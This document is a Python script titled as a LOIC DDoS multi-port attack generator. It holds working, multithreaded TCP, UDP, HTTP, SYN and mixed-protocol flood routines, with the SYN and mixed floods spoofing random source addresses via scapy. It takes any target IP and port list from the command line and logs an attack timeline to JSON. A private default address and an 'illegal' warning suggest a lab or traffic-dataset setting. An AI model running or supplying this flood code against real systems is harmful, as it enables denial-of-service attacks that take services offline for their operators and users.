from scapy.all import *
import threading
import time
import random
import socket
import json
from datetime import datetime
import requests

# ======== CONFIG ========
TARGET_IP = "192.168.17.140"
TARGET_PORTS = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389, 8080]  
LOG_FILE = "loic_ddos_timeline.json"

class LOICAttackGenerator:
    """LOIC DDoS Attack Generator - Multi Port"""
    
    def __init__(self, target_ip, target_ports=None):
        self.target_ip = target_ip
        self.target_ports = target_ports if target_ports else [80]
        self.attacks = []
        self.packets_sent = 0
        self.requests_sent = 0
        self.stop_attack = False
    
    def get_random_port(self):
      
        return random.choice(self.target_ports)
    
    def log_attack_start(self, attack_type, description):
  
        self.current_attack = {
            "attack_type": attack_type,
            "description": description,
            "target_ip": self.target_ip,
            "target_ports": self.target_ports,
            "start_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f'),
            "start_timestamp": time.time(),
        }
        print(f"\n{'='*60}")
        print(f"[+] Attack: {attack_type}")
        print(f"[+] Description: {description}")
        print(f"[+] Target: {self.target_ip}")
        print(f"[+] Ports: {self.target_ports}")
        print(f"[+] Start: {self.current_attack['start_time']}")
        print(f"{'='*60}\n")
        
        self.stop_attack = False
        self.packets_sent = 0
        self.requests_sent = 0
    
    def log_attack_end(self):
     
        self.stop_attack = True
        
        self.current_attack['end_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')
        self.current_attack['end_timestamp'] = time.time()
        self.current_attack['duration_seconds'] = round(
            self.current_attack['end_timestamp'] - self.current_attack['start_timestamp'], 2
        )
        self.current_attack['packets_sent'] = self.packets_sent
        self.current_attack['requests_sent'] = self.requests_sent
        
        print(f"\n[✓] Attack completed")
        print(f"[✓] Duration: {self.current_attack['duration_seconds']}s")
        print(f"[✓] Packets: {self.packets_sent}")
        print(f"[✓] Requests: {self.requests_sent}\n")
        
        self.attacks.append(self.current_attack)
    
    def save_timeline(self):
    
        with open(LOG_FILE, 'w') as f:
            json.dump(self.attacks, f, indent=2)
        
        print(f"\n[✓] Timeline saved to: {LOG_FILE}")
        self.print_summary()
    
    def print_summary(self):

        print("\n" + "="*60)
        print("LOIC DDoS ATTACK SUMMARY")
        print("="*60)
        
        total_packets = 0
        total_requests = 0
        
        for i, attack in enumerate(self.attacks, 1):
            print(f"\n#{i} - {attack['attack_type']}")
            print(f"   Ports: {attack['target_ports']}")
            print(f"   Duration: {attack['duration_seconds']}s")
            print(f"   Packets: {attack['packets_sent']}")
            print(f"   Requests: {attack['requests_sent']}")
            
            total_packets += attack['packets_sent']
            total_requests += attack['requests_sent']
        
        print("\n" + "="*60)
        print(f"Total attacks: {len(self.attacks)}")
        print(f"Total packets: {total_packets}")
        print(f"Total requests: {total_requests}")
        print("="*60)


# ======== 1. TCP Flood - Multi Port ========
def loic_tcp_flood(attacker, duration=30, threads=50):
    
    attacker.log_attack_start("LOIC_TCP_FLOOD", "Multi-port TCP flood attack")
    
    def tcp_flood_worker():
        """Worker thread للـ TCP flood"""
        while not attacker.stop_attack:
            try:
                target_port = attacker.get_random_port()
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((attacker.target_ip, target_port))
                
                data = random._urandom(1024)
                sock.send(data)
                
                attacker.packets_sent += 1
                
                sock.close()
            except:
                pass
            
            time.sleep(0.01)
    
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=tcp_flood_worker, daemon=True)
        t.start()
        threads_list.append(t)
    
    time.sleep(duration)
    attacker.log_attack_end()
    
    for t in threads_list:
        t.join(timeout=2)


# ======== 2. UDP Flood - Multi Port ========
def loic_udp_flood(attacker, duration=30, threads=50):
    
    attacker.log_attack_start("LOIC_UDP_FLOOD", "Multi-port UDP flood attack")
    
    def udp_flood_worker():
        """Worker thread للـ UDP flood"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while not attacker.stop_attack:
            try:
            
                target_port = attacker.get_random_port()
                
                payload_size = random.randint(512, 4096)
                payload = random._urandom(payload_size)
                
                sock.sendto(payload, (attacker.target_ip, target_port))
                attacker.packets_sent += 1
            except:
                pass
            
            time.sleep(0.001)
        
        sock.close()
    
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=udp_flood_worker, daemon=True)
        t.start()
        threads_list.append(t)
    
    time.sleep(duration)
    attacker.log_attack_end()
    
    for t in threads_list:
        t.join(timeout=2)


# ======== 3. HTTP Flood - Multi Port ========
def loic_http_flood(attacker, duration=30, threads=30):
   
    attacker.log_attack_start("LOIC_HTTP_FLOOD", "Multi-port HTTP GET/POST flood")
    
    
    http_ports = [p for p in attacker.target_ports if p in [80, 443, 8080, 8443]]
    
    if not http_ports:
        print("  [!] No HTTP ports in target list, skipping...")
        attacker.log_attack_end()
        return
    
    def http_flood_worker():
        """Worker thread للـ HTTP flood"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
            'LOIC/1.0',
        ]
        
        methods = ['GET', 'POST', 'HEAD']
        paths = ['/', '/index.html', '/admin', '/api']
        
        while not attacker.stop_attack:
            try:
                
                target_port = random.choice(http_ports)
                
                method = random.choice(methods)
                path = random.choice(paths)
                url = f"http://{attacker.target_ip}:{target_port}{path}"
                
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Connection': 'keep-alive',
                }
                
                if method == 'GET':
                    requests.get(url, headers=headers, timeout=2)
                elif method == 'POST':
                    requests.post(url, headers=headers, timeout=2)
                
                attacker.requests_sent += 1
                
            except:
                pass
            
            time.sleep(0.05)
    
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=http_flood_worker, daemon=True)
        t.start()
        threads_list.append(t)
    
    time.sleep(duration)
    attacker.log_attack_end()
    
    for t in threads_list:
        t.join(timeout=2)


# ======== 4. SYN Flood - Multi Port ========
def loic_syn_flood(attacker, duration=30):
   
    attacker.log_attack_start("LOIC_SYN_FLOOD", "Multi-port TCP SYN flood")
    
    end_time = time.time() + duration
    
    while time.time() < end_time:
       
        target_port = attacker.get_random_port()
        
        pkt = IP(dst=attacker.target_ip, src=RandIP()) / \
              TCP(sport=RandShort(), dport=target_port, flags="S", seq=RandInt())
        
        send(pkt, verbose=False)
        attacker.packets_sent += 1
        
        if attacker.packets_sent % 1000 == 0:
            print(f"  [{datetime.now().strftime('%H:%M:%S')}] Sent {attacker.packets_sent} SYN packets")
    
    attacker.log_attack_end()


# ======== 5. Port Scan Flood ========
def loic_portscan_flood(attacker, duration=30):
    
    attacker.log_attack_start("LOIC_PORTSCAN_FLOOD", "Aggressive port scan flood")
    
    end_time = time.time() + duration
    
    while time.time() < end_time:
        
        for port in attacker.target_ports:
            if time.time() >= end_time:
                break
            
           
            pkt = IP(dst=attacker.target_ip, src=RandIP()) / \
                  TCP(sport=RandShort(), dport=port, flags="S")
            
            send(pkt, verbose=False)
            attacker.packets_sent += 1
        
        if attacker.packets_sent % 500 == 0:
            print(f"  [{datetime.now().strftime('%H:%M:%S')}] Scanned {attacker.packets_sent} ports")
    
    attacker.log_attack_end()


# ======== 6. Mixed Protocol Multi-Port ========
def loic_mixed_multiport(attacker, duration=30):

    attacker.log_attack_start("LOIC_MIXED_MULTIPORT", "Mixed protocol multi-port flood")
    
    def mixed_worker():
      
        while not attacker.stop_attack:
            try:
                target_port = attacker.get_random_port()
                proto = random.choice(['syn', 'ack', 'udp'])
                
                if proto == 'syn':
                    pkt = IP(dst=attacker.target_ip, src=RandIP()) / \
                          TCP(dport=target_port, flags="S")
                    
                elif proto == 'ack':
                    pkt = IP(dst=attacker.target_ip, src=RandIP()) / \
                          TCP(dport=target_port, flags="A")
                    
                elif proto == 'udp':
                    pkt = IP(dst=attacker.target_ip, src=RandIP()) / \
                          UDP(dport=target_port) / \
                          Raw(load=random._urandom(512))
                
                send(pkt, verbose=False)
                attacker.packets_sent += 1
                
            except:
                pass
            
            time.sleep(0.001)
    
    threads_list = []
    for _ in range(40):
        t = threading.Thread(target=mixed_worker, daemon=True)
        t.start()
        threads_list.append(t)
    
    time.sleep(duration)
    attacker.log_attack_end()
    
    for t in threads_list:
        t.join(timeout=2)


# ======== MAIN ========
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='LOIC DDoS Multi-Port Attack Generator')
    parser.add_argument('-t', '--target', required=True, help='Target IP')
    parser.add_argument('-p', '--ports', 
                       default='21,22,23,25,53,80,443,445,3306,3389,8080',
                       help='Target ports (comma-separated)')
    parser.add_argument('-d', '--duration', type=int, default=30, 
                       help='Attack duration per type (seconds)')
    parser.add_argument('-a', '--attack',
                       choices=['tcp', 'udp', 'http', 'syn', 'portscan', 'mixed', 'all'],
                       default='all',
                       help='Attack type')
    
    args = parser.parse_args()
    
   
    target_ports = [int(p.strip()) for p in args.ports.split(',')]
    
    print("\n" + "="*60)
    print("LOIC DDoS MULTI-PORT ATTACK GENERATOR")
    print("="*60)
    print(f"Target: {args.target}")
    print(f"Ports: {target_ports}")
    print(f"Attack: {args.attack}")
    print(f"Duration: {args.duration}s per attack")
    print("="*60 + "\n")
    
    print("⚠️  WARNING: DDoS attacks are ILLEGAL!")
    print("⚠️  Use only in authorized environments!\n")
    
    input("Press ENTER to start...")
    
    attacker = LOICAttackGenerator(args.target, target_ports)
    
    try:
        if args.attack == 'tcp':
            loic_tcp_flood(attacker, args.duration)
        elif args.attack == 'udp':
            loic_udp_flood(attacker, args.duration)
        elif args.attack == 'http':
            loic_http_flood(attacker, args.duration)
        elif args.attack == 'syn':
            loic_syn_flood(attacker, args.duration)
        elif args.attack == 'portscan':
            loic_portscan_flood(attacker, args.duration)
        elif args.attack == 'mixed':
            loic_mixed_multiport(attacker, args.duration)
        elif args.attack == 'all':
            attacks = [
                ('TCP Flood', loic_tcp_flood),
                ('UDP Flood', loic_udp_flood),
                ('HTTP Flood', loic_http_flood),
                ('SYN Flood', loic_syn_flood),
                ('Port Scan Flood', loic_portscan_flood),
                ('Mixed Multi-Port', loic_mixed_multiport),
            ]
            
            for name, attack_func in attacks:
                print(f"\n>>> Starting {name} <<<")
                attack_func(attacker, args.duration)
                print(f"\n[*] Waiting 10 seconds...\n")
                time.sleep(10)
    
    except KeyboardInterrupt:
        print("\n\n[!] Stopped by user")
    
    finally:
        attacker.save_timeline()


if __name__ == "__main__":
    main()
